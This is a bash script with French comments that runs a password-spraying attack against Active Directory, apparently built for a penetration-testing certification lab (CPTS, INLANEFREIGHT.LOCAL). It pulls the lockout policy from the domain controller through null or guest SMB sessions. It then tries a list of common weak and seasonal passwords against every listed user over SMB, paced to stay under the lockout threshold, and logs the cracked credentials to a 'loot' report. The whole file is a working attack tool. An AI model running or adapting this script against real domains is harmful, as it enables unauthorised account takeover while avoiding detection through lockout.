#!/bin/bash
# spray.sh — Password spray AD avec vérification du lockout automatique
# Usage: ./spray.sh <users-file> <DC-IP> <domain> [password-file]
# Exemple: ./spray.sh users.txt 10.129.20.3 INLANEFREIGHT.LOCAL
#          ./spray.sh users.txt 10.129.20.3 INLANEFREIGHT.LOCAL custom_passwords.txt
#
# Ce que ça fait :
#   1. Récupère la password policy du domaine (lockout threshold)
#   2. Affiche un WARNING si lockout < 5
#   3. Tente les passwords de la liste (1 par round, pause entre rounds)
#   4. Alerte immédiatement en cas de succès
#   5. Output markdown des succès

set -e

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'; B='\033[1m'; NC='\033[0m'

if [[ $# -lt 3 ]]; then
    echo -e "${R}Usage: $0 <users-file> <DC-IP> <domain> [password-file]${NC}"
    echo ""
    echo "  Ex: $0 users.txt 10.129.20.3 INLANEFREIGHT.LOCAL"
    echo "  Ex: $0 users.txt 10.129.20.3 INLANEFREIGHT.LOCAL my_passwords.txt"
    exit 1
fi

USERS_FILE="$1"
DC_IP="$2"
DOMAIN="$3"
PASS_FILE="${4:-}"

if [[ ! -f "$USERS_FILE" ]]; then
    echo -e "${R}[!] Fichier users introuvable : $USERS_FILE${NC}"
    exit 1
fi

USER_COUNT=$(wc -l < "$USERS_FILE")

# Passwords par défaut (dans l'ordre de priorité basé sur CPTS + AEN2)
DEFAULT_PASSWORDS=(
    "Welcome1"
    "Welcome1!"
    "Password123"
    "Password1"
    "Spring$(date +%Y)!"
    "Summer$(date +%Y)!"
    "Winter$(date +%Y)!"
    "Fall$(date +%Y)!"
    "Spring$(($(date +%Y)-1))!"
    "Summer$(($(date +%Y)-1))!"
    "$(echo "$DOMAIN" | cut -d'.' -f1 | sed 's/./\u&/')$(date +%Y)!"
    "$(echo "$DOMAIN" | cut -d'.' -f1 | sed 's/./\u&/')1"
    "P@ssw0rd"
    "Passw0rd!"
    "Company123"
)

RESULTS_FILE="./spray-results-$(date +%Y%m%d-%H%M).md"
FOUND=0

echo -e "${B}${C}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║   spray.sh — Password Spray AD"
echo "╠══════════════════════════════════════════════════════╣"
echo "║   Users   : $USERS_FILE ($USER_COUNT users)"
echo "║   DC      : $DC_IP"
echo "║   Domain  : $DOMAIN"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ───────────────────────────────────────
# 1. Password Policy (CRITIQUE avant spray)
# ───────────────────────────────────────
echo -e "${C}[1] Récupération de la password policy...${NC}"
echo ""

POLICY=""
if command -v nxc &>/dev/null; then
    POLICY=$(nxc smb "$DC_IP" -u '' -p '' --pass-pol 2>/dev/null || \
             nxc smb "$DC_IP" -u 'guest' -p '' --pass-pol 2>/dev/null || true)
fi

if [[ -z "$POLICY" ]] && command -v enum4linux-ng &>/dev/null; then
    POLICY=$(enum4linux-ng "$DC_IP" -P 2>/dev/null || true)
fi

LOCKOUT_THRESHOLD=0
LOCKOUT_DURATION=0
OBSERVATION_WINDOW=0

if [[ -n "$POLICY" ]]; then
    echo "$POLICY"
    # Extraire le threshold
    LOCKOUT_THRESHOLD=$(echo "$POLICY" | grep -iE "lockout.*threshold|Account.*lockout.*threshold" | grep -oE "[0-9]+" | head -1 || echo "0")
    LOCKOUT_DURATION=$(echo "$POLICY" | grep -iE "lockout.*duration|lockout.*observation" | grep -oE "[0-9]+" | head -1 || echo "0")
else
    echo -e "${Y}[~] Impossible de récupérer la policy (creds requis ou LDAP null refusé)${NC}"
    echo -e "${Y}    Estimation conservatrice : threshold = 5${NC}"
    LOCKOUT_THRESHOLD=5
fi

echo ""

# Avertissement lockout
if [[ "$LOCKOUT_THRESHOLD" -gt 0 && "$LOCKOUT_THRESHOLD" -lt 4 ]]; then
    echo -e "${R}${B}[!!!] DANGER — Lockout threshold : $LOCKOUT_THRESHOLD${NC}"
    echo -e "${R}    Spray trop risqué. Réduire à MAX 1-2 tentatives par user.${NC}"
    echo -e "${R}    Attendre $LOCKOUT_DURATION minutes entre les rounds.${NC}"
    echo ""
    read -r -p "Continuer quand même ? [y/N] " confirm
    [[ "$confirm" =~ ^[yY]$ ]] || exit 0
elif [[ "$LOCKOUT_THRESHOLD" -eq 0 ]]; then
    echo -e "${Y}[~] Lockout threshold = 0 ou inconnu — traiter comme threshold = 3 par précaution${NC}"
else
    echo -e "${G}[✓] Lockout threshold : $LOCKOUT_THRESHOLD — spray possible${NC}"
fi

# Calcul de la pause entre rounds (laisser 2x le observation window pour être safe)
WAIT_MINUTES=30
if [[ "$LOCKOUT_DURATION" -gt 0 ]]; then
    WAIT_MINUTES=$((LOCKOUT_DURATION + 5))
fi

echo ""
echo -e "${Y}Pause entre les rounds : ${B}${WAIT_MINUTES} minutes${NC}"
echo -e "${Y}(modifier avec WAIT_MINUTES=X avant de lancer si besoin)${NC}"
echo ""

# ───────────────────────────────────────
# 2. Build de la liste de passwords
# ───────────────────────────────────────
if [[ -n "$PASS_FILE" && -f "$PASS_FILE" ]]; then
    mapfile -t PASSWORDS < "$PASS_FILE"
    echo -e "${C}[2] Password list custom : $PASS_FILE (${#PASSWORDS[@]} passwords)${NC}"
else
    PASSWORDS=("${DEFAULT_PASSWORDS[@]}")
    echo -e "${C}[2] Password list par défaut (${#PASSWORDS[@]} passwords)${NC}"
fi

echo ""

# Rapport markdown
{
    echo "# 🎯 Password Spray — $DOMAIN"
    echo ""
    echo "**Date :** $(date +"%Y-%m-%d %H:%M")"
    echo "**DC :** \`$DC_IP\`"
    echo "**Users :** $USER_COUNT"
    echo "**Lockout threshold :** $LOCKOUT_THRESHOLD"
    echo ""
    echo "## Résultats"
    echo ""
} > "$RESULTS_FILE"

# ───────────────────────────────────────
# 3. Spray — 1 password à la fois
# ───────────────────────────────────────
ROUND=0
for password in "${PASSWORDS[@]}"; do
    ((ROUND++))

    echo -e "${B}━━━ Round $ROUND : '$password' ($(date +%H:%M)) ━━━${NC}"

    ROUND_FOUND=0
    TEMP_RESULTS=""

    if command -v nxc &>/dev/null; then
        # nxc spray
        OUTPUT=$(nxc smb "$DC_IP" -u "$USERS_FILE" -p "$password" -d "$DOMAIN" \
            --continue-on-success --no-bruteforce 2>/dev/null | grep -v "\[-\]" || true)

        if [[ -n "$OUTPUT" ]]; then
            SUCCESSES=$(echo "$OUTPUT" | grep "\[+\]" || true)

            if [[ -n "$SUCCESSES" ]]; then
                echo -e "${R}${B}[!!!] SUCCÈS avec password : '$password'${NC}"
                echo "$SUCCESSES"

                while IFS= read -r line; do
                    found_user=$(echo "$line" | grep -oP "(?<=\\\\)[^\s]+" || echo "?")
                    echo -e "  ${G}✓${NC} ${B}$found_user${NC} : $password"
                    TEMP_RESULTS+="| $found_user | $password | $DOMAIN | SMB | $DC_IP | $(date +%Y-%m-%d) |\n"
                    ((FOUND++))
                    ((ROUND_FOUND++))
                done <<< "$SUCCESSES"

                # Appender au rapport
                echo "### Round $ROUND — Password: \`$password\`" >> "$RESULTS_FILE"
                echo "" >> "$RESULTS_FILE"
                echo -e "$TEMP_RESULTS" >> "$RESULTS_FILE"

                echo ""
                echo -e "${R}[!!!] Tester immédiatement avec cred-test.sh :${NC}"
                echo "$SUCCESSES" | while IFS= read -r line; do
                    u=$(echo "$line" | grep -oP "(?<=\\\\)[^\s]+" || echo "?")
                    echo "    ./creds/cred-test.sh '$u' '$password' $DC_IP $DOMAIN"
                done
                echo ""
            fi
        fi
    else
        # Fallback : smbclient manuel
        while IFS= read -r user; do
            [[ -z "$user" ]] && continue
            if smbclient -U "$DOMAIN\\$user%$password" -L "//$DC_IP" &>/dev/null; then
                echo -e "  ${G}✓${NC} ${B}$user${NC} : $password"
                TEMP_RESULTS+="| $user | $password | $DOMAIN | SMB | $DC_IP | $(date +%Y-%m-%d) |\n"
                ((FOUND++))
                ((ROUND_FOUND++))
            fi
        done < "$USERS_FILE"
    fi

    if [[ $ROUND_FOUND -eq 0 ]]; then
        echo -e "  ${Y}Aucun succès avec '$password'${NC}"
    fi

    # Pause entre les rounds (sauf pour le dernier)
    if [[ "$ROUND" -lt "${#PASSWORDS[@]}" ]]; then
        echo ""
        echo -e "${Y}  [~] Pause $WAIT_MINUTES min avant le prochain round...${NC}"
        echo -e "${Y}      (Ctrl+C pour arrêter / Ctrl+Z pour mettre en pause)${NC}"
        echo ""
        sleep "${WAIT_MINUTES}m"
    fi
done

# ───────────────────────────────────────
# Résumé final
# ───────────────────────────────────────
{
    echo ""
    echo "## Résumé"
    echo ""
    echo "| Stat | Valeur |"
    echo "|---|---|"
    echo "| Users testés | $USER_COUNT |"
    echo "| Passwords testés | ${#PASSWORDS[@]} |"
    echo "| Succès | $FOUND |"
    echo ""
    echo "> **Coller les succès dans** : \`03_LOOT.md\` → Section Credentials"
} >> "$RESULTS_FILE"

echo ""
echo -e "${B}━━━ SPRAY TERMINÉ ━━━${NC}"
echo -e "  Succès total : ${B}$FOUND${NC}"
echo -e "  Rapport      : ${B}$RESULTS_FILE${NC}"
[[ $FOUND -gt 0 ]] && echo -e "${R}[!!!] Reporter dans 03_LOOT.md IMMÉDIATEMENT${NC}"
